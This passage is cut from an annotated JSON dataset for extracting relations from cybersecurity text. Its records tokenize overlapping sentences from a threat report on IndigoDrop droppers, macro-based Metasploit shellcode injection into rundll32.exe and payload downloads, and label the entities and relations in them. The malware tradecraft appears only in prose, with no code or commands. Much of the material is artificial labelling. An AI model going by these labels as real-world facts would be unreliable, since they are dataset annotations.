[{"type": "MP", "sent_id": 6, "global_pos": [135, 135], "name": "droppers", "pos": [1, 2], "index": "23_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [140, 140], "name": "IPs", "pos": [6, 7], "index": "24_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [149, 149], "name": "payloads", "pos": [15, 16], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [152, 152], "name": "droppers", "pos": [1, 2], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [159, 159], "name": "dropper", "pos": [8, 9], "index": "27_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [163, 163], "name": "EXE file", "pos": [12, 14], "index": "28_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 2}, {"r": "EX", "evidence": [0], "t": 0, "h": 2}, {"r": "ST", "evidence": [0], "t": 1, "h": 2}, {"r": "RF", "evidence": [0], "t": 1, "h": 2}, {"r": "CO", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "RD", "evidence": [2], "h": 8, "t": 9}, {"r": "IJ", "evidence": [2], "h": 8, "t": 10}, {"r": "RD", "evidence": [3], "h": 11, "t": 12}, {"r": "IJ", "evidence": [3], "h": 11, "t": 13}, {"r": "ST", "evidence": [3], "h": 11, "t": 14}, {"r": "RF", "evidence": [3], "h": 11, "t": 14}, {"r": "RD", "evidence": [3, 4], "h": 11, "t": 15}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 16}, {"r": "ST", "evidence": [3, 4], "h": 11, "t": 17}, {"r": "RF", "evidence": [3, 4], "h": 11, "t": 17}, {"r": "WR", "evidence": [3, 4], "h": 11, "t": 18}, {"r": "ST", "evidence": [5], "h": 19, "t": 20}, {"r": "RF", "evidence": [5], "h": 19, "t": 20}, {"r": "FR", "evidence": [5], "h": 21, "t": 22}, {"r": "ST", "evidence": [6], "h": 23, "t": 24}, {"r": "RF", "evidence": [6], "h": 23, "t": 24}, {"r": "WR", "evidence": [6], "h": 23, "t": 25}, {"r": "CO", "evidence": [6, 7], "h": 23, "t": 26}, {"r": "EX", "evidence": [7], "h": 27, "t": 28}]}, {"title": "643-58", "sents": [["This", "attack-chain", "consists", "of", "a", "maldoc", "with", "an", "embedded", "macro", "."], ["The", "macro", "consists", "of", "code", "that", "can", "inject", "the", "hardcoded", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "into", "a", "benign", "32-bit", "process", "."], ["The", "macro", "code", "used", "to", "inject", "shellcode", "into", "rundll32.exe", "contacts", "the", "local", "team", "server", "192", "."], ["The", "Metasploit", "downloader", "shellcode", "was", "embedded", "in", "the", "test", "samples", "and", "connected", "to", "a", "local", "IP", "address", "to", "download", "the", "third-stage", "payloads", "(", "Stages", "3x", ")", "."], ["Metasploit", "downloader", "connecting", "to", "a", "local", "IP", "in", "the", "dropper", ":", "Sept.", "2019", ":", "Productionized", "samples", "and", "embedded", "MSF", "shellcodeThe", "attackers", "finalized", "their", "attack", "structure", "in", "September", "2019", "and", "started", "distributing", "copies", "of", "IndigoDrop", "."], ["These", "droppers", "now", "connected", "to", "public", "IPs", "operated", "by", "the", "attackers", "to", "download", "the", "third-stage", "payloads", "."], ["These", "droppers", "were", "multi-staged", "where", ":", "The", "actual", "dropper", "was", "a", "malicious", "EXE", "file", "."], ["This", "dropper", "would", "extract", "an", "embedded", "DLL", "and", "drop", "it", "to", "disk", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "attack-chain", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "maldoc", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "macro", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [12, 12], "name": "macro", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [15, 15], "name": "code", "pos": [4, 5], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "shellcode", "pos": [12, 13], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "process", "pos": [21, 22], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [35, 35], "name": "macro code", "pos": [1, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [40, 40], "name": "shellcode", "pos": [6, 7], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "rundll32.exe", "pos": [8, 9], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [47, 47], "name": "server", "pos": [13, 14], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [53, 53], "name": "shellcode", "pos": [3, 4], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "test samples", "pos": [8, 10], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [65, 65], "name": "IP address", "pos": [15, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "payloads", "pos": [21, 22], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "downloader", "pos": [1, 2], "index": "15_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [82, 82], "name": "local IP", "pos": [5, 7], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [97, 97], "name": "attackers", "pos": [20, 21], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [110, 110], "name": "IndigoDrop", "pos": [33, 34], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [113, 113], "name": "droppers", "pos": [1, 2], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [118, 118], "name": "IPs", "pos": [6, 7], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [127, 127], "name": "payloads", "pos": [15, 16], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [130, 130], "name": "droppers", "pos": [1, 2], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [137, 137], "name": "dropper", "pos": [8, 9], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [141, 141], "name": "EXE file", "pos": [12, 14], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [145, 145], "name": "dropper", "pos": [1, 2], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [150, 150], "name": "DLL", "pos": [6, 7], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [153, 153], "name": "it", "pos": [9, 10], "index": "27_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "IJ", "evidence": [1], "h": 4, "t": 6}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "IJ", "evidence": [2], "h": 7, "t": 9}, {"r": "ST", "evidence": [2], "h": 7, "t": 10}, {"r": "RF", "evidence": [2], "h": 7, "t": 10}, {"r": "RD", "evidence": [2, 3], "h": 7, "t": 11}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 12}, {"r": "ST", "evidence": [2, 3], "h": 7, "t": 13}, {"r": "RF", "evidence": [2, 3], "h": 7, "t": 13}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 14}, {"r": "ST", "evidence": [4], "h": 15, "t": 16}, {"r": "RF", "evidence": [4], "h": 15, "t": 16}, {"r": "FR", "evidence": [4], "h": 17, "t": 18}, {"r": "ST", "evidence": [5], "h": 19, "t": 20}, {"r": "RF", "evidence": [5], "h": 19, "t": 20}, {"r": "WR", "evidence": [5], "h": 19, "t": 21}, {"r": "CO", "evidence": [5, 6], "h": 19, "t": 22}, {"r": "CO", "evidence": [5, 6, 7], "h": 19, "t": 25}, {"r": "EX", "evidence": [6], "h": 23, "t": 24}, {"r": "RD", "evidence": [7], "h": 25, "t": 26}, {"r": "CO", "evidence": [7], "h": 26, "t": 27}]}, {"title": "643-59", "sents": [["The", "macro", "consists", "of", "code", "that", "can", "inject", "the", "hardcoded", "MSF", "downloader", "shellcode", "(", "Stage", "2A", ")", "into", "a", "benign", "32-bit", "process", "."], ["The", "macro", "code", "used", "to", "inject", "shellcode", "into", "rundll32.exe", "contacts", "the", "local", "team", "server", "192", "."], ["The", "Metasploit", "downloader", "shellcode", "was", "embedded", "in", "the", "test", "samples", "and", "connected", "to", "a", "local", "IP", "address", "to", "download", "the", "third-stage", "payloads", "(", "Stages", "3x", ")", "."], ["Metasploit", "downloader", "connecting", "to", "a", "local", "IP", "in", "the", "dropper", ":", "Sept.", "2019", ":", "Productionized", "samples", "and", "embedded", "MSF", "shellcodeThe", "attackers", "finalized", "their", "attack", "structure", "in", "September", "2019", "and", "started", "distributing", "copies", "of", "IndigoDrop", "."], ["These", "droppers", "now", "connected", "to", "public", "IPs", "operated", "by", "the", "attackers", "to", "download", "the", "third-stage", "payloads", "."], ["These", "droppers", "were", "multi-staged", "where", ":", "The", "actual", "dropper", "was", "a", "malicious", "EXE", "file", "."], ["This", "dropper", "would", "extract", "an", "embedded", "DLL", "and", "drop", "it", "to", "disk", "."], ["The", "dropper", "then", "activates", "the", "DLL", "using", "rundll32.exe", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "macro", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "code", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "shellcode", "pos": [12, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "process", "pos": [21, 22], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "macro code", "pos": [1, 3], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "shellcode", "pos": [6, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "rundll32.exe", "pos": [8, 9], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [36, 36], "name": "server", "pos": [13, 14], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "shellcode", "pos": [3, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "test samples", "pos": [8, 10], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [54, 54], "name": "IP address", "pos": [15, 17], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "payloads", "pos": [21, 22], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [67, 67], "name": "downloader", "pos": [1, 2], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [71, 71], "name": "local IP", "pos": [5, 7], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [86, 86], "name": "attackers", "pos": [20, 21], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [99, 99], "name": "IndigoDrop", "pos": [33, 34], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "droppers", "pos": [1, 2], "index": "16_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [107, 107], "name": "IPs", "pos": [6, 7], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [116, 116], "name": "payloads", "pos": [15, 16], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [119, 119], "name": "droppers", "pos": [1, 2], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [126, 126], "name": "dropper", "pos": [8, 9], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [130, 130], "name": "EXE file", "pos": [12, 14], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [134, 134], "name": "dropper", "pos": [1, 2], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [139, 139], "name": "DLL", "pos": [6, 7], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [142, 142], "name": "it", "pos": [9, 10], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [147, 147], "name": "dropper", "pos": [1, 2], "index": "25_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [151, 151], "name": "DLL", "pos": [5, 6], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [153, 153], "name": "rundll32.exe", "pos": [7, 8], "index": "27_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 1, "t": 2}, {"r": "IJ", "evidence": [0], "h": 1, "t": 3}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "IJ", "evidence": [1], "h": 4, "t": 6}, {"r": "ST", "evidence": [1], "h": 4, "t": 7}, {"r": "RF", "evidence": [1], "h": 4, "t": 7}, {"r": "RD", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "WR", "evidence": [1, 2], "h": 4, "t": 9}, {"r": "ST", "evidence": [1, 2], "h": 4, "t": 10}, {"r": "RF", "evidence": [1, 2], "h": 4, "t": 10}, {"r": "WR", "evidence": [1, 2], "h": 4, "t": 11}, {"r": "ST", "evidence": [3], "h": 12, "t": 13}, {"r": "RF", "evidence": [3], "h": 12, "t": 13}, {"r": "FR", "evidence": [3], "h": 14, "t": 15}, {"r": "ST", "evidence": [4], "h": 16, "t": 17}, {"r": "RF", "evidence": [4], "h": 16, "t": 17}, {"r": "WR", "evidence": [4], "h": 16, "t": 18}, {"r": "CO", "evidence": [4, 5], "h": 16, "t": 19}, {"r": "CO", "evidence": [4, 5, 6], "h": 16, "t": 22}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 16, "t": 25}, {"r": "EX", "evidence": [5], "h": 20, "t": 21}, {"r": "RD", "evidence": [6], "h": 22, "t": 23}, {"r": "CO", "evidence": [6], "h": 23, "t": 24}, {"r": "FR", "evidence": [7], "h": 25, "t": 27}, {"r": "EX", "evidence": [7], "t": 26, "h": 27}]}, {"title": "643-60", "sents": [["The", "macro", "code", "used", "to", "inject", "shellcode", "into", "rundll32.exe", "contacts", "the", "local", "team", "server", "192", "."], ["The", "Metasploit", "downloader", "shellcode", "was", "embedded", "in", "the", "test", "samples", "and", "connected", "to", "a", "local", "IP", "address", "to", "download", "the", "third-stage", "payloads", "(", "Stages", "3x", ")", "."], ["Metasploit", "downloader", "connecting", "to", "a", "local", "IP", "in", "the", "dropper", ":", "Sept.", "2019", ":", "Productionized", "samples", "and", "embedded", "MSF", "shellcodeThe", "attackers", "finalized", "their", "attack", "structure", "in", "September", "2019", "and", "started", "distributing", "copies", "of", "IndigoDrop", "."], ["These", "droppers", "now", "connected", "to", "public", "IPs", "operated", "by", "the", "attackers", "to", "download", "the", "third-stage", "payloads", "."], ["These", "droppers", "were", "multi-staged", "where", ":", "The", "actual", "dropper", "was", "a", "malicious", "EXE", "file", "."], ["This", "dropper", "would", "extract", "an", "embedded", "DLL", "and", "drop", "it", "to", "disk", "."], ["The", "dropper", "then", "activates", "the", "DLL", "using", "rundll32.exe", "."], ["The", "DLL", "is", "responsible", "for", "downloading", "and", "executing", "the", "third-stage", "payload", "from", "an", "attacker", "operated", "server", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "macro code", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "shellcode", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "rundll32.exe", "pos": [8, 9], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [13, 13], "name": "server", "pos": [13, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "shellcode", "pos": [3, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "test samples", "pos": [8, 10], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [31, 31], "name": "IP address", "pos": [15, 17], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "payloads", "pos": [21, 22], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "downloader", "pos": [1, 2], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [48, 48], "name": "local IP", "pos": [5, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [63, 63], "name": "attackers", "pos": [20, 21], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "IndigoDrop", "pos": [33, 34], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "droppers", "pos": [1, 2], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [84, 84], "name": "IPs", "pos": [6, 7], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "payloads", "pos": [15, 16], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "droppers", "pos": [1, 2], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [103, 103], "name": "dropper", "pos": [8, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [107, 107], "name": "EXE file", "pos": [12, 14], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [111, 111], "name": "dropper", "pos": [1, 2], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [116, 116], "name": "DLL", "pos": [6, 7], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [119, 119], "name": "it", "pos": [9, 10], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [124, 124], "name": "dropper", "pos": [1, 2], "index": "21_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [128, 128], "name": "DLL", "pos": [5, 6], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [130, 130], "name": "rundll32.exe", "pos": [7, 8], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [133, 133], "name": "DLL", "pos": [1, 2], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [142, 142], "name": "payload", "pos": [10, 11], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [147, 147], "name": "server", "pos": [15, 16], "index": "26_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "IJ", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "h": 0, "t": 3}, {"r": "RF", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "ST", "evidence": [0, 1], "h": 0, "t": 6}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 6}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 7}, {"r": "ST", "evidence": [2], "h": 8, "t": 9}, {"r": "RF", "evidence": [2], "h": 8, "t": 9}, {"r": "FR", "evidence": [2], "h": 10, "t": 11}, {"r": "ST", "evidence": [3], "h": 12, "t": 13}, {"r": "RF", "evidence": [3], "h": 12, "t": 13}, {"r": "WR", "evidence": [3], "h": 12, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 12, "t": 15}, {"r": "CO", "evidence": [3, 4, 5], "h": 12, "t": 18}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 12, "t": 21}, {"r": "EX", "evidence": [4], "h": 16, "t": 17}, {"r": "RD", "evidence": [5], "h": 18, "t": 19}, {"r": "CO", "evidence": [5], "h": 19, "t": 20}, {"r": "FR", "evidence": [6], "h": 21, "t": 23}, {"r": "EX", "evidence": [6], "t": 22, "h": 23}, {"r": "EX", "evidence": [6, 7], "t": 22, "h": 24}, {"r": "WR", "evidence": [7], "h": 24, "t": 25}, {"r": "EX", "evidence": [7], "h": 24, "t": 25}, {"r": "ST", "evidence": [7], "h": 24, "t": 26}, {"r": "RF", "evidence": [7], "h": 24, "t": 26}]}, {"title": "643-61", "sents": [["The", "Metasploit", "downloader", "shellcode", "was", "embedded", "in", "the", "test", "samples", "and", "connected", "to", "a", "local", "IP", "address", "to", "download", "the", "third-stage", "payloads", "(", "Stages", "3x", ")", "."], ["Metasploit", "downloader", "connecting", "to", "a", "local", "IP", "in", "the", "dropper", ":", "Sept.", "2019", ":", "Productionized", "samples", "and", "embedded", "MSF", "shellcodeThe", "attackers", "finalized", "their", "attack", "structure", "in", "September", "2019", "and", "started", "distributing", "copies", "of", "IndigoDrop", "."], ["These", "droppers", "now", "connected", "to", "public", "IPs", "operated", "by", "the", "attackers", "to", "download", "the", "third-stage", "payloads", "."], ["These", "droppers", "were", "multi-staged", "where", ":", "The", "actual", "dropper", "was", "a", "malicious", "EXE", "file", "."], ["This", "dropper", "would", "extract", "an", "embedded", "DLL", "and", "drop", "it", "to", "disk", "."], ["The", "dropper", "then", "activates", "the", "DLL", "using", "rundll32.exe", "."], ["The", "DLL", "is", "responsible", "for", "downloading", "and", "executing", "the", "third-stage", "payload", "from", "an", "attacker", "operated", "server", "."], ["The", "DLL", "does", "this", "by", "executing", "minimal", "python", "code", "using", "the", "python27.dll", "library", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "shellcode", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "test samples", "pos": [8, 10], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [15, 15], "name": "IP address", "pos": [15, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [21, 21], "name": "payloads", "pos": [21, 22], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "downloader", "pos": [1, 2], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [32, 32], "name": "local IP", "pos": [5, 7], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [47, 47], "name": "attackers", "pos": [20, 21], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [60, 60], "name": "IndigoDrop", "pos": [33, 34], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [63, 63], "name": "droppers", "pos": [1, 2], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [68, 68], "name": "IPs", "pos": [6, 7], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [77, 77], "name": "payloads", "pos": [15, 16], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "droppers", "pos": [1, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "dropper", "pos": [8, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [91, 91], "name": "EXE file", "pos": [12, 14], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [95, 95], "name": "dropper", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [100, 100], "name": "DLL", "pos": [6, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [103, 103], "name": "it", "pos": [9, 10], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [108, 108], "name": "dropper", "pos": [1, 2], "index": "17_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [112, 112], "name": "DLL", "pos": [5, 6], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [114, 114], "name": "rundll32.exe", "pos": [7, 8], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [117, 117], "name": "DLL", "pos": [1, 2], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [126, 126], "name": "payload", "pos": [10, 11], "index": "21_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [131, 131], "name": "server", "pos": [15, 16], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [134, 134], "name": "DLL", "pos": [1, 2], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [140, 140], "name": "python code", "pos": [7, 9], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [144, 144], "name": "python27.dll library", "pos": [11, 13], "index": "25_0"}]], "labels": [{"r": "ST", "evidence": [1], "h": 4, "t": 5}, {"r": "RF", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 8, "t": 9}, {"r": "RF", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [2], "h": 8, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 11}, {"r": "CO", "evidence": [2, 3, 4], "h": 8, "t": 14}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 8, "t": 17}, {"r": "EX", "evidence": [3], "h": 12, "t": 13}, {"r": "RD", "evidence": [4], "h": 14, "t": 15}, {"r": "CO", "evidence": [4], "h": 15, "t": 16}, {"r": "FR", "evidence": [5], "h": 17, "t": 19}, {"r": "EX", "evidence": [5], "t": 18, "h": 19}, {"r": "EX", "evidence": [5, 6], "t": 18, "h": 20}, {"r": "WR", "evidence": [6], "h": 20, "t": 21}, {"r": "EX", "evidence": [6], "h": 20, "t": 21}, {"r": "ST", "evidence": [6], "h": 20, "t": 22}, {"r": "RF", "evidence": [6], "h": 20, "t": 22}, {"r": "FR", "evidence": [7], "h": 23, "t": 25}, {"r": "EX", "evidence": [7], "t": 24, "h": 25}]}, {"title": "643-62", "sents": [["Metasploit", "downloader", "connecting", "to", "a", "local", "IP", "in", "the", "dropper", ":", "Sept.", "2019", ":", "Productionized", "samples", "and", "embedded", "MSF", "shellcodeThe", "attackers", "finalized", "their", "attack", "structure", "in", "September", "2019", "and", "started", "distributing", "copies", "of", "IndigoDrop", "."], ["These", "droppers", "now", "connected", "to", "public", "IPs", "operated", "by", "the", "attackers", "to", "download", "the", "third-stage", "payloads", "."], ["These", "droppers", "were", "multi-staged", "where", ":", "The", "actual", "dropper", "was", "a", "malicious", "EXE", "file", "."], ["This", "dropper", "would", "extract", "an", "embedded", "DLL", "and", "drop", "it", "to", "disk", "."], ["The", "dropper", "then", "activates", "the", "DLL", "using", "rundll32.exe", "."], ["The", "DLL", "is", "responsible", "for", "downloading", "and", "executing", "the", "third-stage", "payload", "from", "an", "attacker", "operated", "server", "."], ["The", "DLL", "does", "this", "by", "executing", "minimal", "python", "code", "using", "the", "python27.dll", "library", "."], ["Instead", ",", "the", "shellcode", "was", "hosted", "on", "an", "attacker-controlled", "and", "operated", "server", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "downloader", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [5, 5], "name": "local IP", "pos": [5, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "attackers", "pos": [20, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [33, 33], "name": "IndigoDrop", "pos": [33, 34], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "droppers", "pos": [1, 2], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [41, 41], "name": "IPs", "pos": [6, 7], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [50, 50], "name": "payloads", "pos": [15, 16], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [53, 53], "name": "droppers", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "dropper", "pos": [8, 9], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "EXE file", "pos": [12, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "dropper", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [73, 73], "name": "DLL", "pos": [6, 7], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "it", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [81, 81], "name": "dropper", "pos": [1, 2], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [85, 85], "name": "DLL", "pos": [5, 6], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [87, 87], "name": "rundll32.exe", "pos": [7, 8], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [90, 90], "name": "DLL", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [99, 99], "name": "payload", "pos": [10, 11], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [104, 104], "name": "server", "pos": [15, 16], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [107, 107], "name": "DLL", "pos": [1, 2], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [113, 113], "name": "python code", "pos": [7, 9], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [117, 117], "name": "python27.dll library", "pos": [11, 13], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [123, 123], "name": "shellcode", "pos": [3, 4], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [131, 